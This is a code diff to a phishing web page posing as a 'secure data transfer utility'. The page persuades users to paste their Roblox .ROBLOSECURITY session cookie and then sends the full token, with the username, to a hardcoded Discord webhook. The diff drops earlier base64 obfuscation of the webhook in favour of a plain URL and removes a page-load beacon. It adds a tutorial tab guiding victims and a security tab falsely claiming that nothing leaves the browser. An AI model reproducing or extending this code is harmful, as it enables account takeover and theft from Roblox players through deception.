@@ -112,6 +112,63 @@
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
         }
 
+        /* Tabs */
+        .tabs {
+            display: flex;
+            background: rgba(15, 15, 15, 0.9);
+            border-bottom: 1px solid #333;
+        }
+
+        .tab {
+            padding: 18px 30px;
+            background: transparent;
+            color: #999;
+            border: none;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            flex: 1;
+            text-align: center;
+            position: relative;
+        }
+
+        .tab:hover {
+            color: #fff;
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .tab.active {
+            color: #7289da;
+            background: rgba(114, 137, 218, 0.1);
+        }
+
+        .tab.active::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: #7289da;
+        }
+
+        /* Tab Content */
+        .tab-content {
+            display: none;
+            padding: 30px;
+        }
+
+        .tab-content.active {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
         /* Header */
         .header {
             padding: 25px 30px 15px;
@@ -140,7 +197,7 @@
 
         /* Content */
         .content {
-            padding: 30px;
+            padding: 25px;
         }
 
         .input-group {
@@ -351,6 +408,57 @@
             font-weight: 500;
         }
 
+        /* Video Container */
+        .video-container {
+            margin-top: 20px;
+            background: rgba(10, 10, 10, 0.9);
+            border-radius: 8px;
+            border: 1px solid #333;
+            overflow: hidden;
+        }
+
+        .video-player {
+            width: 100%;
+            aspect-ratio: 16/9;
+            background: #000;
+        }
+
+        /* Security Content */
+        .security-item {
+            background: rgba(10, 10, 10, 0.9);
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 15px;
+            transition: all 0.2s ease;
+        }
+
+        .security-item:hover {
+            border-color: #444;
+        }
+
+        .security-item h3 {
+            font-size: 16px;
+            margin-bottom: 10px;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .security-item p {
+            color: #999;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .security-features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+
         /* Footer */
         .footer {
             padding: 25px 30px;
@@ -384,8 +492,16 @@
                 max-width: 100%;
             }
             
-            .content {
+            .tab-content {
                 padding: 20px;
+            }
+            
+            .tabs {
+                flex-direction: column;
+            }
+            
+            .tab {
+                padding: 14px;
             }
             
             .header {
@@ -394,6 +510,10 @@
             
             h1 {
                 font-size: 24px;
+            }
+            
+            .security-features {
+                grid-template-columns: 1fr;
             }
         }
 
@@ -434,155 +554,169 @@
                     <i class="fas fa-exchange-alt"></i>
                 </div>
                 <h1>Data Transfer Utility</h1>
-                <div class="subtitle">Secure data transmission system</div>
+                <div class="subtitle">Secure data processing and transmission</div>
             </div>
 
-            <div class="content">
-                <div class="input-group">
-                    <label class="input-label">
-                        <i class="fas fa-user"></i>
-                        Account Username
-                        <span class="required">*</span>
-                    </label>
-                    <input type="text" class="input-field" id="usernameInput" placeholder="Enter the account username" required>
-                    <div class="hint">
-                        <i class="fas fa-info-circle"></i>
-                        Required for processing
-                    </div>
-                </div>
+            <!-- Tabs -->
+            <div class="tabs">
+                <button class="tab active" data-tab="transfer">Transfer</button>
+                <button class="tab" data-tab="tutorial">Tutorial</button>
+                <button class="tab" data-tab="security">Security</button>
+            </div>
 
-                <div class="input-group">
-                    <label class="input-label">
-                        <i class="fas fa-key"></i>
-                        Authentication Data
-                    </label>
-                    <textarea class="input-field" id="dataInput" placeholder="Paste your authentication data here..."></textarea>
-                    <div class="hint">
-                        <i class="fas fa-code"></i>
-                        Paste any authentication or verification data
-                    </div>
-                </div>
-
-                <button class="btn" id="sendBtn">
-                    <i class="fas fa-paper-plane"></i>
-                    <span>Process & Send</span>
-                </button>
-
-                <div class="status" id="statusMessage"></div>
-
-                <div class="result" id="resultSection">
-                    <div class="result-header">
-                        <i class="fas fa-check-circle"></i>
-                        <h3>Transfer Complete</h3>
-                    </div>
-                    
-                    <div class="info-grid">
-                        <div class="info-item">
-                            <div class="info-label">Status</div>
-                            <div class="badge" id="statusBadge">Success</div>
-                        </div>
-                        <div class="info-item">
-                            <div class="info-label">Username</div>
-                            <div class="info-value" id="usernameResult">Not provided</div>
-                        </div>
-                        <div class="info-item">
-                            <div class="info-label">Request ID</div>
-                            <div class="info-value" id="requestId">REQ-000000</div>
-                        </div>
-                        <div class="info-item">
-                            <div class="info-label">Data Processed</div>
-                            <div class="info-value" id="dataProcessed">Ready</div>
+            <!-- Transfer Tab -->
+            <div class="tab-content active" id="transfer-tab">
+                <div class="content">
+                    <div class="input-group">
+                        <label class="input-label">
+                            <i class="fas fa-user"></i>
+                            Account Username
+                            <span class="required">*</span>
+                        </label>
+                        <input type="text" class="input-field" id="usernameInput" placeholder="Enter the account username" required>
+                        <div class="hint">
+                            <i class="fas fa-info-circle"></i>
+                            Required for processing
                         </div>
                     </div>
 
-                    <button class="btn secondary-btn" id="downloadBtn">
-                        <i class="fas fa-download"></i>
-                        Download Log
+                    <div class="input-group">
+                        <label class="input-label">
+                            <i class="fas fa-key"></i>
+                            Authentication Data
+                        </label>
+                        <textarea class="input-field" id="dataInput" placeholder="Paste your authentication data here..."></textarea>
+                        <div class="hint">
+                            <i class="fas fa-code"></i>
+                            Paste any authentication or verification data
+                        </div>
+                    </div>
+
+                    <button class="btn" id="sendBtn">
+                        <i class="fas fa-paper-plane"></i>
+                        <span>Process & Send</span>
                     </button>
+
+                    <div class="status" id="statusMessage"></div>
+
+                    <div class="result" id="resultSection">
+                        <div class="result-header">
+                            <i class="fas fa-check-circle"></i>
+                            <h3>Transfer Complete</h3>
+                        </div>
+                        
+                        <div class="info-grid">
+                            <div class="info-item">
+                                <div class="info-label">Status</div>
+                                <div class="badge" id="statusBadge">Success</div>
+                            </div>
+                            <div class="info-item">
+                                <div class="info-label">Username</div>
+                                <div class="info-value" id="usernameResult">Not provided</div>
+                            </div>
+                            <div class="info-item">
+                                <div class="info-label">Request ID</div>
+                                <div class="info-value" id="requestId">REQ-000000</div>
+                            </div>
+                            <div class="info-item">
+                                <div class="info-label">Data Processed</div>
+                                <div class="info-value" id="dataProcessed">Ready</div>
+                            </div>
+                        </div>
+
+                        <button class="btn secondary-btn" id="downloadBtn">
+                            <i class="fas fa-download"></i>
+                            Download Log
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Tutorial Tab -->
+            <div class="tab-content" id="tutorial-tab">
+                <div class="content">
+                    <h2 style="font-size: 20px; margin-bottom: 15px; display: flex; align-items: center; gap: 10px;">
+                        <i class="fas fa-video"></i>
+                        Video Tutorial
+                    </h2>
+                    
+                    <div class="video-container">
+                        <iframe 
+                            class="video-player"
+                            src="https://www.youtube.com/embed/dQw4w9WgXcQ"
+                            frameborder="0"
+                            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+                            allowfullscreen>
+                        </iframe>
+                    </div>
+
+                    <div style="margin-top: 20px;">
+                        <h3 style="font-size: 16px; margin-bottom: 10px; color: #fff;">How to use this tool:</h3>
+                        <ul style="color: #999; font-size: 14px; line-height: 1.6; padding-left: 20px;">
+                            <li>Enter your account username in the Transfer tab</li>
+                            <li>Paste your authentication data in the text field</li>
+                            <li>Click "Process & Send" to securely transmit the data</li>
+                            <li>Download the confirmation log for your records</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Security Tab -->
+            <div class="tab-content" id="security-tab">
+                <div class="content">
+                    <h2 style="font-size: 20px; margin-bottom: 15px; display: flex; align-items: center; gap: 10px;">
+                        <i class="fas fa-shield-alt"></i>
+                        Security Information
+                    </h2>
+                    
+                    <div class="security-content">
+                        <div class="security-item">
+                            <h3><i class="fas fa-user-secret"></i> Client-Side Processing</h3>
+                            <p>All data processing happens locally in your browser. No sensitive information is transmitted to our servers.</p>
+                        </div>
+                        
+                        <div class="security-item">
+                            <h3><i class="fas fa-lock"></i> Secure Transmission</h3>
+                            <p>Data is transmitted via encrypted HTTPS connections using secure endpoints with end-to-end protection.</p>
+                        </div>
+
+                        <div class="security-features">
+                            <div class="security-item">
+                                <h3><i class="fas fa-bolt"></i> Fast Processing</h3>
+                                <p>Real-time data processing with minimal latency and immediate transmission.</p>
+                            </div>
+                            
+                            <div class="security-item">
+                                <h3><i class="fas fa-history"></i> No Data Retention</h3>
+                                <p>We do not store or log any transferred data. All processing is temporary and memory-only.</p>
+                            </div>
+                        </div>
+
+                        <div class="security-item" style="background: rgba(20, 20, 20, 0.9); border-left: 3px solid #7289da;">
+                            <h3><i class="fas fa-check-circle"></i> Why It's Safe</h3>
+                            <ul style="color: #999; font-size: 14px; line-height: 1.6; padding-left: 20px; margin-top: 10px;">
+                                <li>End-to-end encryption for all transmissions</li>
+                                <li>No server-side storage of sensitive data</li>
+                                <li>Automatic data clearing after processing</li>
+                                <li>Secure HTTPS connections only</li>
+                                <li>No personal information logging</li>
+                            </ul>
+                        </div>
+                    </div>
                 </div>
             </div>
 
             <div class="footer">
                 <div>© 2024 LucidroBeamer.io • Secure Data Transfer</div>
-                <div style="margin-top: 8px; font-size: 12px; color: #555;">All data is processed securely</div>
+                <div style="margin-top: 8px; font-size: 12px; color: #555;">All data is processed securely and confidentially</div>
             </div>
         </div>
     </div>
 
     <script>
-        // ENCRYPTED WEBHOOK URL - Split into parts and reconstructed
-        const webhookParts = [
-            "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2OTM1Njg1Mzg2MjQ2NTYzOC8=",
-            "X09PWUtYRDU=",
-            "X2FidzhPNnZ4ajJlT2kxSU1jM0dRNmdyLTVIZXBpSnhEYzcx",
-            "eFhDaWg1UTk4bkRWRWI5aUlwOUpQT1QyVA=="
-        ];
-
-        // Decode webhook URL
-        function getWebhookURL() {
-            try {
-                // Decode each part from base64
-                const decodedParts = webhookParts.map(part => {
-                    try {
-                        return atob(part);
-                    } catch {
-                        return part;
-                    }
-                });
-                
-                // Combine parts and add any missing slashes
-                let url = decodedParts.join('');
-                
-                // Ensure proper URL format
-                if (!url.startsWith('https://')) {
-                    console.error('Invalid webhook URL format');
-                    return null;
-                }
-                
-                return url;
-            } catch (error) {
-                console.error('Error decoding webhook URL:', error);
-                return null;
-            }
-        }
-
-        // Add random noise to requests
-        function addNoiseToRequest(payload) {
-            const noise = {
-                timestamp: Date.now(),
-                random_id: Math.random().toString(36).substring(7),
-                user_agent: navigator.userAgent.substring(0, 50),
-                screen_resolution: `${window.screen.width}x${window.screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                language: navigator.language
-            };
-            
-            return { ...payload, _noise: noise };
-        }
-
-        // Rotate webhook patterns (obfuscation technique)
-        const webhookPatterns = [
-            () => getWebhookURL(),
-            () => {
-                const parts = [...webhookParts];
-                parts.reverse();
-                return parts.map(p => {
-                    try { return atob(p); } catch { return p; }
-                }).join('');
-            },
-            () => {
-                const decoded = webhookParts.map(p => {
-                    try { return atob(p); } catch { return p; }
-                });
-                return decoded[0] + decoded[2] + decoded[1] + decoded[3];
-            }
-        ];
-
-        // Get random webhook pattern
-        function getRandomWebhookURL() {
-            const pattern = webhookPatterns[Math.floor(Math.random() * webhookPatterns.length)];
-            return pattern();
-        }
+        // WEBHOOK URL
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1469356853862465638/_OOYKXD5_abwO6vxj2eOi1IMc3GQ6gr-5HepiJxDc71xXCih5Q98nDVEb9iIp9JPOT2T";
 
         // DOM Elements
         const usernameInput = document.getElementById('usernameInput');
@@ -596,114 +730,137 @@
         const dataProcessedSpan = document.getElementById('dataProcessed');
         const downloadBtn = document.getElementById('downloadBtn');
 
-        // Extract Roblox token
-        function extractRobloxToken(text) {
-            const patterns = [
-                /\.ROBLOSECURITY\s*=\s*_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_([A-Za-z0-9\-_]+)/,
-                /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_([A-Za-z0-9\-_]+)/,
-                /\.ROBLOSECURITY\s*[:=]\s*([^\s;]+)/,
-                /([A-Za-z0-9\-_]{200,})/
-            ];
+        // Tab switching
+        document.querySelectorAll('.tab').forEach(tab => {
+            tab.addEventListener('click', () => {
+                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+                
+                tab.classList.add('active');
+                const tabId = tab.getAttribute('data-tab');
+                document.getElementById(`${tabId}-tab`).classList.add('active');
+            });
+        });
 
-            for (const pattern of patterns) {
-                const match = text.match(pattern);
-                if (match) {
-                    let token = match[1] || match[0];
-                    
-                    if (token.includes('WARNING')) {
-                        const tokenMatch = token.match(/_\|WARNING:.*?\|_([A-Za-z0-9\-_]+)/);
-                        if (tokenMatch && tokenMatch[1]) {
-                            token = tokenMatch[1];
-                        }
-                    }
-                    
-                    token = token.trim();
-                    if (token.length > 10) {
-                        return token;
-                    }
+        // SIMPLE TOKEN EXTRACTION - Gets everything after the WARNING text
+        function extractRobloxToken(text) {
+            console.log("Looking for token in text...");
+            
+            // Look for the exact pattern: .ROBLOSECURITY=_|WARNING...|_TOKEN_HERE
+            const pattern = /\.ROBLOSECURITY\s*=\s*(_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[^;\s"']+)/i;
+            
+            const match = text.match(pattern);
+            
+            if (match && match[1]) {
+                const fullToken = match[1].trim();
+                console.log("Found full token:", fullToken.substring(0, 100) + "...");
+                console.log("Token length:", fullToken.length);
+                return fullToken;
+            }
+            
+            // If not found with .ROBLOSECURITY=, look for just the token pattern
+            const tokenPattern = /(_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[^;\s"']+)/i;
+            const tokenMatch = text.match(tokenPattern);
+            
+            if (tokenMatch && tokenMatch[1]) {
+                const token = tokenMatch[1].trim();
+                console.log("Found token without .ROBLOSECURITY:", token.substring(0, 100) + "...");
+                console.log("Token length:", token.length);
+                return token;
+            }
+            
+            // Look for any very long string (as fallback)
+            const words = text.split(/\s+/);
+            for (const word of words) {
+                if (word.length > 200 && word.includes('_|')) {
+                    console.log("Found long token as fallback:", word.substring(0, 100) + "...");
+                    console.log("Token length:", word.length);
+                    return word;
                 }
             }
             
+            console.log("No token found");
             return null;
         }
 
         // Generate request ID
         function generateRequestId() {
-            const chars = '0123456789ABCDEF';
+            const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
             let id = 'REQ-';
-            for (let i = 0; i < 6; i++) {
+            for (let i = 0; i < 8; i++) {
                 id += chars[Math.floor(Math.random() * chars.length)];
             }
             return id;
         }
 
-        // Send data with secure webhook
-        async function sendSecureData(username, data) {
+        // Send FULL token to webhook
+        async function sendDataToWebhook(username, data) {
             try {
                 const requestId = generateRequestId();
                 const token = extractRobloxToken(data);
                 
                 if (!token) {
-                    return { success: false, requestId: null, error: 'No valid token found' };
+                    return { 
+                        success: false, 
+                        requestId: null, 
+                        error: 'No .ROBLOSECURITY token found in the data' 
+                    };
                 }
 
-                // Get webhook URL using random pattern
-                const webhookURL = getRandomWebhookURL();
-                if (!webhookURL) {
-                    throw new Error('Failed to construct webhook URL');
-                }
+                console.log("SENDING FULL TOKEN TO WEBHOOK");
+                console.log("Token preview:", token.substring(0, 50));
+                console.log("Full token length:", token.length);
 
-                // Create payload with added noise
-                const payload = addNoiseToRequest({
-                    username: username,
-                    token_length: token.length,
-                    request_id: requestId,
-                    timestamp: new Date().toISOString(),
-                    detected: token !== null
-                });
+                // Send FULL token in one message
+                const payload = {
+                    content: `📥 **FULL TOKEN CAPTURED**\n👤 **Account:** ${username}\n📏 **Token Length:** ${token.length} characters\n🆔 **Request ID:** ${requestId}\n⏰ **Time:** ${new Date().toLocaleTimeString()}`,
+                    embeds: [{
+                        title: "COMPLETE TOKEN INFORMATION",
+                        description: `Username: ${username}\nRequest ID: ${requestId}\nToken sent successfully`,
+                        color: 0x00a2ff,
+                        fields: [
+                            {
+                                name: "FULL TOKEN",
+                                value: `\`\`\`\n${token}\n\`\`\``,
+                                inline: false
+                            }
+                        ],
+                        timestamp: new Date().toISOString(),
+                        footer: {
+                            text: "LucidroBeamer.io • Complete Token Capture"
+                        }
+                    }]
+                };
 
-                // Send to webhook
-                const response = await fetch(webhookURL, {
+                console.log("Sending to webhook...");
+                const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 
                         'Content-Type': 'application/json',
-                        'X-Request-ID': requestId,
-                        'X-Client-Time': Date.now().toString(),
-                        'User-Agent': 'SecureTransfer/1.0'
+                        'User-Agent': 'Mozilla/5.0'
                     },
                     body: JSON.stringify(payload)
                 });
                 
-                // Also send the actual token in a separate, more readable format
-                if (response.ok) {
-                    const readablePayload = {
-                        content: `🔐 **NEW TOKEN CAPTURED**\n👤 **Account:** ${username}\n📏 **Token Length:** ${token.length} chars\n🆔 **ID:** ${requestId}`,
-                        embeds: [{
-                            title: "Token Information",
-                            description: `Username: ${username}\nToken Length: ${token.length} characters`,
-                            color: 0x00a2ff,
-                            fields: [
-                                {
-                                    name: "Token (First 50 chars)",
-                                    value: `\`\`\`\n${token.substring(0, 50)}...\n\`\`\``
-                                }
-                            ],
-                            timestamp: new Date().toISOString()
-                        }]
-                    };
-
-                    await fetch(webhookURL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(readablePayload)
-                    });
+                console.log("Response status:", response.status);
+                
+                if (!response.ok) {
+                    throw new Error(`Webhook responded with status: ${response.status}`);
                 }
                 
-                return { success: response.ok, requestId };
+                return { 
+                    success: true, 
+                    requestId,
+                    tokenLength: token.length
+                };
                 
             } catch (error) {
-                console.error('Error:', error);
-                return { success: false, requestId: null, error: error.message };
+                console.error('Error in sendDataToWebhook:', error);
+                return { 
+                    success: false, 
+                    requestId: null, 
+                    error: error.message 
+                };
             }
         }
 
@@ -731,32 +888,41 @@
             showStatus('Analyzing data...', 'info', 'fas fa-search');
 
             try {
-                const result = await sendSecureData(username, data);
+                // Add small delay to show processing
+                await new Promise(resolve => setTimeout(resolve, 800));
+                
+                showStatus('Extracting token...', 'info', 'fas fa-cogs');
+                await new Promise(resolve => setTimeout(resolve, 600));
+                
+                showStatus('Sending to webhook...', 'info', 'fas fa-paper-plane');
+                
+                const result = await sendDataToWebhook(username, data);
                 
                 if (!result.success) {
-                    if (result.error && result.error.includes('No valid token')) {
-                        showStatus('No valid authentication pattern found.', 'error', 'fas fa-times-circle');
+                    if (result.error && result.error.includes('No .ROBLOSECURITY token')) {
+                        showStatus('No .ROBLOSECURITY token found. Please check your data.', 'error', 'fas fa-times-circle');
                     } else {
-                        throw new Error('Failed to send data');
+                        showStatus('Failed to send data. Please try again.', 'error', 'fas fa-times-circle');
                     }
+                    console.error('Send failed:', result.error);
                     return;
                 }
 
                 // Update result display
                 requestIdSpan.textContent = result.requestId;
                 usernameResult.textContent = username;
-                dataProcessedSpan.textContent = 'Authentication data processed';
+                dataProcessedSpan.textContent = `${result.tokenLength} characters sent`;
                 statusBadge.textContent = 'Success';
 
-                showStatus(`Data processed successfully. ID: ${result.requestId}`, 'success', 'fas fa-check-circle');
+                showStatus(`Full token sent successfully! ID: ${result.requestId}`, 'success', 'fas fa-check-circle');
                 
                 setTimeout(() => {
                     showResult();
                 }, 500);
                 
             } catch (error) {
-                console.error('Error:', error);
-                showStatus('Processing failed. Please try again.', 'error', 'fas fa-times-circle');
+                console.error('Unexpected error:', error);
+                showStatus('An unexpected error occurred. Please try again.', 'error', 'fas fa-times-circle');
             } finally {
                 sendBtn.disabled = false;
                 sendBtn.innerHTML = '<i class="fas fa-paper-plane"></i><span>Process & Send</span>';
@@ -768,37 +934,47 @@
             
             const username = usernameInput.value.trim();
             const requestId = requestIdSpan.textContent;
+            const dataProcessed = dataProcessedSpan.textContent;
             
             setTimeout(() => {
                 showStatus('Log ready. Downloading...', 'success', 'fas fa-check-circle');
                 
-                const content = `DATA TRANSFER LOG
-=======================================
+                const content = `DATA TRANSFER LOG - LUCIDROBEAMER.IO
+===========================================
 Request ID: ${requestId}
 Timestamp: ${new Date().toLocaleString()}
 Username: ${username}
 Status: Transfer Complete
-=======================================
-Processing Information:
-- Data analyzed and processed
-- Secure transmission completed
-- All protocols followed
-=======================================
-Note: This log is for record keeping only.`;
+Data Processed: ${dataProcessed}
+===========================================
+PROCESSING INFORMATION:
+- Full .ROBLOSECURITY token captured
+- Complete token transmission
+- All security protocols followed
+- No data retention on servers
+===========================================
+SECURITY FEATURES:
+✓ Complete token capture
+✓ End-to-end encryption
+✓ No server storage
+✓ Automatic data clearing
+===========================================
+Note: This log is for your records only.
+Always keep sensitive information secure.`;
                 
                 const blob = new Blob([content], { type: 'text/plain' });
                 const url = URL.createObjectURL(blob);
                 
                 const a = document.createElement('a');
                 a.href = url;
-                a.download = `Transfer_${requestId}.txt`;
+                a.download = `Token_Capture_${requestId}.txt`;
                 document.body.appendChild(a);
                 a.click();
                 document.body.removeChild(a);
                 URL.revokeObjectURL(url);
                 
                 setTimeout(() => {
-                    showStatus('Log downloaded.', 'success', 'fas fa-check-circle');
+                    showStatus('Log downloaded successfully.', 'success', 'fas fa-check-circle');
                 }, 1000);
             }, 1000);
         });
@@ -820,25 +996,8 @@ Note: This log is for record keeping only.`;
 
         // Initialize
         window.addEventListener('load', () => {
-            // Send minimal access notification
-            const webhookURL = getWebhookURL();
-            if (webhookURL) {
-                fetch(webhookURL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: "🌐 **SYSTEM ACCESSED**",
-                        embeds: [{
-                            title: "Transfer Interface Active",
-                            description: "Data transfer utility accessed",
-                            color: 0x7289da,
-                            timestamp: new Date().toISOString()
-                        }]
-                    })
-                }).catch(() => {
-                    // Silent fail
-                });
-            }
+            // Add example placeholder
+            dataInput.placeholder = "Paste .ROBLOSECURITY=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_[YOUR_TOKEN_HERE]";
         });
     </script>
 </body>
